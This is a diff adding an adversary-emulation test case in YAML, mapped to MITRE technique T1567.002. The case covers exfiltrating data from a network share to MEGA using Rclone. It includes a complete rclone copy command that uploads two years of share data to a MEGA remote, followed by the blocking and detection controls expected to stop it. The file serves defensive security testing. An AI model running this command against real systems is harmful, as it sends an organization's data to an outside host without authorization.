@@ -1,0 +1,26 @@
+name: Extract data to MEGA using Rclone
+description: Extract data from a network share using Rclone to upload to MEGA
+metadata:
+  isv: 1
+  tactic: TA0010
+  tid: T1567.002
+  x_vectr_id: a4728676-abd2-478b-9e20-66ed96d99c81
+  x_tools:
+  - https://rclone.org/
+  x_guidance_id: d8d335a8-4c30-47b5-98df-aa3797ae6a19#1
+guidance:
+- CMD> rclone.exe copy --max-age 2y "{{ network_share }}" Mega:DATA -q --ignore-existing --auto-confirm --multi-thread-streams 7 --transfers 7 --bwlimit 10M
+block:
+- Sensitive data sent over common network protocol is blocked by DLP tool
+- Connection to known file-sharing site is blocked by network security tool
+- Block the use of unapproved third-party utilities via application control software
+detect:
+- Sensitive data sent over common network protocol is detected by DLP tool
+- Connection to known file-sharing site is detected by network security tool
+logs:
+- web
+controls:
+- Firewall
+- DLP
+- Web Gateway
+- Application Control
